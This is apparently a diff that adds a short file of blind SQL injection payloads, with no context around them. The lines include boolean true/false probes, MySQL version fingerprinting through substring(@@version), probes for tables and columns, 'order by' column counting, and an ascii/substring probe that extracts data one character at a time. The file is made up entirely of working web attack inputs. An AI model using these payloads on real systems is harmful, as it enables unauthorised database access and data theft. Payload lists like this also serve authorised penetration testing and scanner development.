@@ -1,0 +1,7 @@
+and 1=1; --
+and substring(@@version,1,1)=5; --
+and substring(@@version,1,1)=4; --
+and (select 1 from table limit 0,1)=1; --
+and (select substring(concat(1,column),1,1) from table limit 0,1)=1; --
+order by number; --
+and ascii(substring((select concat(column) from table limit 0,1),1,1))>45; --
